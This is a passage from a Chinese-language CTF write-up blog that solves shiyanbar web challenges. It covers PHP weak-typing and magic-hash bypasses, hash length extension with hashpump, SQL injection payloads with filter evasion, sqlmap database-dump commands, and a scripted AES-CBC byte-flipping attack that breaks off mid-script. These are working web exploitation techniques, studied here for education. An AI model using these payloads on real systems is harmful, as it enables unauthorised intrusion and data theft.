sha1(Array)</code>，即<code>NULL===NULL</code>，从而吐出flag</p><p>?name[]=1&amp;password[]=2<br>Flag: CTF{t3st_th3_Sha1}</p><h3 id="Guess-Next"><a href="#Guess-Next" class="headerlink" title="Guess Next"></a>Guess Next</h3><p>写个算法没准就算出来了，23333<br>hint：你确定你有认真看判断条件？</p><p>解题链接： <a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/Session.php</a>  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200117_574.png" alt=""><br>burpsuite抓包，将phpsessid置空，并get参数password为空就行。。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200118_840.png" alt=""><br> CTF{Cl3ar_th3_S3ss1on}</p><h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>啊拉？又是php审计。已经想吐了。<br>hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/more.php</a> </p><pre><code>&lt;?phpif (isset ($_GET[&#39;password&#39;])) {    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)    {        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;    }    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)    {        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)        {            die(&#39;Flag: &#39; . $flag);        }        else        {            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);        }    }    else    {        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;    }}?&gt;</code></pre><p>1.ereg漏洞：首先第一层检查需要绕过ereg漏洞，百度可以知道存在截断的问题，ereg读到%00的时候，就截止了</p><p>2.strlen()限制了长度小于8并且大小必须大于9999999,1e8=100000000 &gt; 9999999</p><p>3.strpos()对password进行匹配，必须含有-，最终才输出flag</p><p>于是构造?password=1e9%00<em>-</em></p><p>Flag: CTF{Ch3ck_anD_Ch3ck}</p><blockquote><p><a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="external">http://blog.csdn.net/qq_31481187/article/details/60968595</a></p></blockquote><h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>找回密码<br>格式：SimCTF{ }<br>解题链接： <a href="http://ctf5.shiyanbar.com/10/upload/" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/upload/</a> </p><p>进入网站step1.php，查看源代码，发现一句<meta name="editor" content="Vim"></p><p>vim编辑，可能存在.xxxx.php.swp的备份文件。尝试了.step1.php.swp、.step2.php.swp，都是404，查看step2.php的源码，发现有一个Submit.php，直接访问，提示you are not an admin，访问.submit.php.swp，果然存在，源码如下</p><pre><code>if(!empty($token)&amp;&amp;!empty($emailAddress)){    if(strlen($token)!=10) die(&#39;fail&#39;);    if($token!=&#39;0&#39;) die(&#39;fail&#39;);    $sql = &quot;SELECT count(*) as num from `user` where token=&#39;$token&#39; AND email=&#39;$emailAddress&#39;&quot;;    $r = mysql_query($sql) or die(&#39;db error&#39;);    $r = mysql_fetch_assoc($r);    $r = $r[&#39;num&#39;];    if($r&gt;0){        echo $flag;    }else{        echo &quot;you are not an admin&quot;;    }}</code></pre><p>邮箱为admin的邮箱，要求token长度为10，且token需要等于零。</p><p>邮箱在step1.php中有提到<meta name="admin" content="admin@simplexue.com"></p><p>token验证可以用php中的0exxxxxxxx绕过。</p><p>payload：?emailAddress=admin@simplexue.com&amp;token=0e11111111</p><p>flag：SimCTF{huachuan_TdsWX}</p><h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200134_866.png" alt=""><br>让username的MD5和0相等，可以让MD5以0e开头。<br><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷/bug</a></p><p>username输入QNKCDZO，得到/user.php?fame=hjkleffifer，访问页面看到一段php源码。</p><pre><code>$unserialize_str = $_POST[&#39;password&#39;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]==&#39;???&#39;) {    print_r($flag); }</code></pre><p>这段php将post的password值进行了反序列化，得到了一个数组，将数组的user和pass的值和???进行了比较。比较用到了php的弱类型，bool类型的true跟任意字符串可以弱类型相等<br>因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）<br>payload:post：a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}</p><p>flag:ctf{dwduwkhduw5465}</p><h3 id="Forms-1"><a href="#Forms-1" class="headerlink" title="Forms"></a>Forms</h3><p>查看网页源代码。</p><pre><code>&lt;input type=&quot;hidden&quot; name=&quot;showsource&quot; value=0&gt;</code></pre><p>将type中的hidden去掉，并赋值value=1，提交，就能看到源代码了。</p><pre><code>$a = $_POST[&quot;PIN&quot;];if ($a == -19827747736161128312837161661727773716166727272616149001823847) {    echo &quot;Congratulations! The flag is $flag&quot;;} else {    echo &quot;User with provided PIN not found.&quot;; }</code></pre><p>让a等于对应的数字，就能得到flag。</p><p>flag：ctf{forms_are_easy}</p><h3 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h3><p>题目的意思就是通过改变地址栏访问index.php，但是限制了条件不能使用 ./  ../ \ 而且只能使用小写字母，不可以在php后加点，这里我们可以利用伪静态技术，使用<a href="http://ctf5.shiyanbar.com/indirection/index.php/index.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/indirection/index.php/index.php</a><br>index.php后的index.php会被当做参数处理，所以服务器只会解析第一个index.php，满足条件成功绕过。</p><p>URL重写，其实就是把带一大堆参数的url，变成一个看上去很规矩的url,主要目的是为了搜索引擎。</p><h3 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h3><p>先用burpsuite抓包，发现setcookie中有source=0，在cookie中赋值，将其改为1，得到源代码。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201255_194.png" alt=""></p><pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        }        else {            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);        }    }    else {        die (&quot;You are not an admin! LEAVE.&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    if ($_COOKIE[&quot;source&quot;] != 0) {        echo &quot;&quot;; // This source code is outputted here    }}</code></pre><p>samlpe-hash是15位的secret+adminadmin的md5值，要获得flag，要让cookie中的getmein值等于secret+username+password的md5值，password又不能等于admin，所以要利用哈希扩展攻击，这里直接用的hashpump工具。</p><pre><code>hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a admin</code></pre><p>输出结果</p><pre><code>e18dfd8404515016d3aeeea2aa196909admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin</code></pre><p>将\x换成%并填入对应位置。<br>hash2</p><p>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p><p>打开网页，查看源代码，获得提示<!-- please post what you find with parameter:key -->，让我们post参数key。</p><p>抓包发现header头中有经过base64编码的flag参数，<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200157_179.png" alt=""><br>将参数解码P0ST_THIS_T0_CH4NGE_FL4G:9x3PyMMd9，将参数9x3PyMMd9post却没有结果，题目中说尽快的提交，猜测与时间有关，用python脚本解</p><pre><code>import requests,refrom base64 import b64decodes = requests.Session()url = &#39;http://ctf5.shiyanbar.com/web/10/10.php&#39;r = s.get(url)head = r.headersflag = b64decode(head[&#39;flag&#39;]).split(&#39;:&#39;)[1]r1 = s.post(url, data={&#39;key&#39;:flag})print r1.text</code></pre><h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>1.判断<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201346_982.png" alt=""><br>2.判断过滤<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1 and 1=1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201347_373.png" alt=""></p><blockquote><p>过滤空格方法</p><ol><li>注释/<strong>/绕过空格     select user() from d     变成`select/</strong>/user()/<strong>/from/</strong>/`</li><li>括号绕过空格     select user() from dual where 1=1 and 2=2     变成     select(user())from dual where(1=1)and(2=2)</li><li>使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a</li></ol></blockquote><pre><code>对页面输入下面的测试项测试过滤规则测试项    输入    是否过滤逗号    ,&#39;    否注释符#    #&#39;    是注释符 --    --&#39;    是注释符/**/    /**/&#39;    否updatexml函数    updatexml &#39;    否select    select&#39;    否select    select &#39;    是select    select/**/&#39;    否select    /*!select*/    否or    or&#39;    否and    and&#39;    否concat    concat &#39;    否group_concat    group_concat&#39;    是group_concat    /*groupt_concat*/&#39;    是group_concat    groupgroup_concat_concat&#39;    否</code></pre><p>3.判断有那些数据库：</p><pre><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/&#39;1&#39;=&#39;1</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201407_844.png" alt=""></p><ol><li>查看有哪些数据表：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/<strong>/‘1’=’1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201415_889.png" alt=""><br> 发现了flag的表，我们猜测应该是在web1数据库中并且字段就是flag（其实就在本页面的数据库中）<br>故：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/</strong>/union/<strong>/select/</strong>/flag/<strong>/from/</strong>/web1.flag/<strong>/where/</strong>/‘1’=’1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201419_771.png" alt=""><br>方法二：<br>双空格双查询<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere ‘1’=’1</li></ol><p>###简单的sql注入之2<br>用?id=1 and 1=1测试，返回SQLi detected!，这是过滤了and？又尝试了很多关键字，都返回SQLi detected!，那可能是过滤了空格。<br>绕过空格<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201422_573.png" alt=""><br>payload</p><pre><code>http://ctf5.shiyanbar.com/web/index_2.php/?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201437_337.png" alt=""></p><h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>注库名</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=1&quot; --dbs</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201444_689.png" alt=""></p><p>当前数据库<br>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php/?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php/?id=1</a>“ –current-db</p><p>注表名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” –tables<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201453_629.png" alt=""></p><p>注字段<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” -T “flag” –columns<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201457_156.png" alt=""><br>注内容<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=123" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=123</a>“ -D “web1” -T “flag” -C “flag” –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201517_635.png" alt=""></p><p>flag{Y0u_@r3_5O_dAmn_90Od}</p><h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p><a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/pcat/source.txt</a></p><pre><code>&lt;?phperror_reporting(0);if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {  echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;    die;}function AttackFilter($StrKey,$StrValue,$ArrReq){      if (is_array($StrValue)){        $StrValue=implode($StrValue);    }    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){           print &quot;水可载舟，亦可赛艇！&quot;;        exit();    }}$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;foreach($_POST as $key=&gt;$value){     AttackFilter($key,$value,$filter);}$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con){  die(&#39;Could not connect: &#39; . mysql_error());}$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) {     $key = mysql_fetch_array($query);    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {        print &quot;CTF{XXXXXX}&quot;;    }else{        print &quot;亦可赛艇！&quot;;    }}else{  print &quot;一颗赛艇！&quot;;}mysql_close($con);?&gt;</code></pre><p>注意过滤了这些关键字</p><pre><code>$filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)“;</code></pre><p>要输出flag就要满足<code>mysql_num_rows($query) == 1、$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>这两个条件。</p><p>mysql_num_rows()函数返回结果集中行的数目。我们构造uname让sql语句查询出来的结果是一行就能绕过。Uname = ‘or 1 limit 1#，这样sql语句就是SELECT * FROM interest WHERE uname = ‘’or 1 limit 1#，这样就查询1行，也就能绕过第一个条件。<br>从源码分析可得，过滤了逗号，我们不能简单的使用limit 1,1这样的语法，而是可以使用limit 1 offset 1。</p><p>第二个条件是让查询的pwd的值等于输入的值，此处用的是 ==，根据弱类型，NULL和空字符串是相等的，然后就是绕过pwd了，<br>这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的</p><p>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2 （从第二行开始查询）#注释<br>此时密码只要为空即可查询成功</p><p>payload:uname=’or 1 group by pwd with rollup limit 1 OFFSET 2#</p><p>flag：CTF{with_rollup_interesting}</p><h3 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h3><p>自己没做出来<br>别人的wp三种方法：<br><a href="https://www.jianshu.com/p/5d34b3722128" target="_blank" rel="external">https://www.jianshu.com/p/5d34b3722128</a></p><h3 id="登录一下好吗？？"><a href="#登录一下好吗？？" class="headerlink" title="登录一下好吗？？"></a>登录一下好吗？？</h3><p>题目地址: <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a></p><p>在用户名表单里提交一系列字段可以发现题目过滤了几乎所有查询语句，注释，但是没有过滤’，这里的绕过比较巧妙，由于=是从左到到运算的，所以可以人为构造0=0的结果，payload为username=1’=’&amp;password=1’=’，拼接后的语句为:</p><pre><code>select * from user where username=&#39;1&#39;=&#39;&#39; and password=&#39;1&#39;=&#39;&#39;</code></pre><p>username=’1’=’’这句，先有username=’1’返回0，然后再和’’比较，mysql中的弱类型比较0和空字符串是相等的，所以能返回1，后面半句同理，所以整句能够返回1，flag为ctf{51d1bf8fb65a8c2406513ee8f52283e7}。<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011614_554.png" alt=""></p><h3 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="*你真的会PHP吗？"></a>*你真的会PHP吗？</h3><p>首先fiddler抓包，在response header中发现hint:6c525af4059b4fe7d8c33a.txt,打开后找到index.php源码<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201958_595.png" alt=""></p><pre><code>&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_POST[&#39;number&#39;])){   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);   die(&quot;have a fun!!&quot;); }foreach([$_POST] as $global_var) {     foreach($global_var as $key =&gt; $value) {         $value = trim($value);         is_string($value) &amp;&amp; $req[$key] = addslashes($value);     } } function is_palindrome_number($number) {     $number = strval($number);     $i = 0;     $j = strlen($number) - 1;     while($i &lt; $j) {         if($number[$i] !== $number[$j]) {             return false;         }         $i++;         $j--;     }     return true; } if(is_numeric($_REQUEST[&#39;number&#39;])){   $info=&quot;sorry, you cann&#39;t input a number!&quot;;}elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))){     $info = &quot;number must be equal to it&#39;s integer!! &quot;;  }else{     $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));       if($value1!=$value2){          $info=&quot;no, this is not a palindrome number!&quot;;     }else{          if(is_palindrome_number($req[&quot;number&quot;])){              $info = &quot;nice! {$value1} is a palindrome number!&quot;;           }else{             $info=$flag;          }     }}echo $info;</code></pre><p>经过审计我们可以发现如果我们要拿到flag，POST的number需要满足以下条件：<br>1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)<br>2.不能是一个回文数。（is_palindrome_number判断）<br>3.该数的反转的整数值应该和它本身的整数值相等。即：</p><p>intval($req[“number”])=intval(strrev($req[“number”]))<br>1<br>回文数就是类似于121这样的数。从上面可以看出2，3条件似乎是冲突滴！</p><p>下面给出两种解法：</p><p>1.利用intval函数溢出绕过<br>Intval函数获取变量整数值。<br>函数介绍清点这里<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件。通过把空字符可以绕过is_numeric的判断（如%00,%20）,所以我们构造以下poc，number=2147483647%00 和number=2147483647%20都可。</p><p>对于第一个条件，我们需要构造是让我们的poc被函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符和空字符。</p><p>而经过测试我发现is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！！<br><img src="http://oy0tigw51.bkt.clouddn.com/201803202002_274.png" alt=""></p><h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>首先代码审查</p><p>在查看页面源码中发现 代码泄露</p><pre><code>&lt;!-- $password=$_POST[&#39;password&#39;];    $sql = &quot;SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;    $result=mysqli_query($link,$sql);        if(mysqli_num_rows($result)&gt;0){            echo &#39;flag is :&#39;.$flag;        }        else{            echo &#39;密码错误!&#39;;        } --&gt;</code></pre><p>后台对传入的 password进行MD5加密后进行数据库 </p><p>想着怎么去构造一个MD5加密后的结果 在百度上搜了下<br>找到一个字符串  ffifdyop md5后，276f722736c95d99e921722cf9ed621c<br>再转成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code><br>那整个sql变成</p><pre><code>SELECT * FROM admin WHEREusername = &#39;admin&#39; and password = &#39;&#39;or&#39;6&lt;trash&gt;&#39;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804011637_720.png" alt=""></p><h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><p>这题名字叫简单的登录题，实际上一点都不算简单，要认真写一个writeup确实很费劲，但pcat还是写了一篇过得去的。</p><p>1.做题的初步收集、整理<br>index.php是一个普通的登录框，输入id来登录，我们用burpsuite抓下包，并使用Repeater功能。<br>1) 当post id时候，返回包Set-cookie里包含iv和cipher，这2个英文单词玩密码学就很容易理解，iv就是Initialization Vector(初始化向量)，cipher就是密文</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804011324_762.png" alt=""><br>注意这里有个提示：test.php<br>登录得到<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011334_838.png" alt=""><br>查看源码得到<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011335_302.png" alt=""><br>源码过滤|-|#|=|~|union|like|procedure这些语句</p><p>2) 使用Repeater功能不断的发送相同的包，返回的iv和cipher都不一样，基本断定每次的iv值是随机生成，另外iv和cipher的格式都是先base64编码后再进行urlencode编码。这里逻辑几句，不少人总看到base64解码后的字符是乱码后，就问该怎么解密之类的话，其实不要搞混了，base64不是一种加密方式，只是一种编码方式，base64编码后可以让不可视字符可视化（这才是最大的作用），而不起任何加密作用。<br>3) 把iv值经过urldecode再base64解码后用len()得到长度为16，基本猜测算法是aes，而且大胆猜测是aes的cbc模式<br>4) 从id=1入手，发现有#和-都会被waf检测到<br>5) 当cookies里有iv值和cipher值，然后不提交任何参数（包括id），就会显示Hello，猜测是根据传入的iv和cipher来解码后，再参与内部的sql查询出用户名<br>6) 由于aes的key值不知道，我就觉得这题比较难做了，然后先按照web题的基本思路———扫描，打开御剑扫一下，幸运的发现test.php泄露了源码。整理下源码中的逻辑：<br> <em>1 若是post id，就先进行waf检测，检测过了才随机生成iv值，并且对array(‘id’=&gt;$id)进行php的序列化操作，再进行aes加密，再分别对iv和cipher进行base64编码并设置到cookies </em>2 如果cookies里有iv和cipher，就对其base64解码，然后对其aes解密，再进行php反序列化，如果不能反序列化则返回解密后的明文的base64编码，如果可以则进行sql语句拼接，查询若是行数&gt;0就显示其username列的值，否则都是Hello!<br> <em>3 难点1，过滤了#-=,还有union和procedure </em>4 难点2，注入点在limit后面，而且后面还是”,0”，0本来就是让limit取出0行，而前面的逗号更是难弄掉<br> *5 aes的加密模式aes-128-cbc<br>7) mysql语法，limit后面只能procedure还有for update，还有尝试了堆叠注入，也是不行。<br>8) 本题算比较好点，mysql会显示错误信息，这就可以弄报错注入（当前是得有前提的）</p><p>2.构建能绕过过滤的payload<br>尝试了很多，发现post id=1;%00（这里关键是;%00）可以绕过去，然后登录后会显示Hello!rootzz，说明user表里的值是rootzz，而并不是我们所期待的flag值（如果那么简单就好了- -）<br>关键的关键字都被过滤，这可怎么办？<br>这时候要冷静分析下。<br>1) 直接post id时候是有过滤<br>2) 在cookies解密出来是没有过滤，就直接拼接sql语句<br>于是我们可以大胆猜测，修改cookies的值来达到解密后的明文可以构造sql注入。</p><p>这并不是无的放矢，在密码学里是可以做到的</p><p>3.aes的cbc byte flipping attack（cbc字节翻转攻击）<br>先放出参考文章，自己可以多去阅读<br>推荐英文文章：<br><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/" target="_blank" rel="external">http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/</a><br>以下是中文译文（其中图片挂了，结合英文版就没问题）：</p><pre><code>http://wps2015.org/drops/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html=======</code></pre><p>cbc字节翻转攻击，我就不叙述原理，我直接演示一个简单的操作：<br>把id=12的密文修改后解析为id=1#</p><p>这里因为序列化是php的，我先写了一个php文件，便于显示</p><pre><code>&lt;?php$id=@$_POST[&#39;id&#39;];$info = array(&#39;id&#39;=&gt;$id);$plain = serialize($info);$row=ceil(strlen($plain)/16);for($i=0;$i&lt;$row;$i++){    echo substr($plain,$i*16,16).&#39;&lt;br/&gt;&#39;;}</code></pre><p>当post id=12时候，显示<br>a:1:{s:2:”id”;s:<br>2:”12”;}<br>每一行16个字节，这里12的2对应上一行{的偏离量是4<br>有这个准备后，<br>在原题里post id=12，得到下面（这只是示例）<br>iv=ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D<br>cipher=U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D</p><p>运行以下脚本</p><pre><code># -*- coding:utf8 -*-__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibcipher=&#39;U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D&#39;cipher_raw=b64decode(urllib.unquote(cipher))lst=list(cipher_raw)idx=4c1=&#39;2&#39;c2=&#39;#&#39;lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))cipher_new=&#39;&#39;.join(lst)cipher_new=urllib.quote(b64encode(cipher_new))print cipher_new</code></pre><p>得到cipher_new<br>U9qq55BOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D<br>再用之前的iv一起去访问，得到<br>base64_decode(‘g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9’) can’t unserialize<br>这是因为iv值没修改，导致无法反序列化</p><p>运行以下脚本</p><pre><code># -*- coding:utf8 -*-__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibiv=&#39;ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D&#39;iv_raw=b64decode(urllib.unquote(iv))first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;plain=b64decode(&#39;g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9&#39;)iv_new=&#39;&#39;for i in range(16):    iv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))iv_new=urllib.quote(b64encode(iv_new))print iv_new</code></pre><p>得到iv_new<br>hHlJ4xkEBvpldXUI0wqnNA%3D%3D<br>再跟之前的cipher_new，一起去访问，得到<br>Hello!rootzz<br>也就是id=12顺利变成了id=1#注入成功。</p><p>离成功就差一步了，<br>1) 把上面的过程编写成脚本<br>2) 尽可能只翻转一个字节，例如把2nion翻转为union，末尾再用;%00来注释掉后面<br>3) 由于逗号被过滤，用join来代替；等号被过滤，用regexp来代替</p><p>以下是pcat的脚本：</p><pre><code># -*- coding:utf8 -*-# 请保留我的个人信息，谢谢~！__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibimport requestsimport redef mydecode(value):    return b64decode(urllib.unquote(value))def myencode(value):    return urllib.quote(b64encode(value))def mycbc(value,idx,c1,c2):    lst=list(value)    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))    return &#39;&#39;.join(lst)def pcat(payload,idx,c1,c2):    url=r&#39;http://ctf5.shiyanbar.com/web/jiandan/index.php&#39;    myd={&#39;id&#39;:payload}    res=requests.post(url,data=myd)    cookies=res.headers[&#39;Set-Cookie&#39;]    iv=re.findall(r&#39;iv=(.*?),&#39;,cookies)[0]    cipher=re.findall(r&#39;cipher=(.*)&#39;,cookies)[0]    iv_raw=mydecode(iv)    cipher_raw=mydecode(cipher)    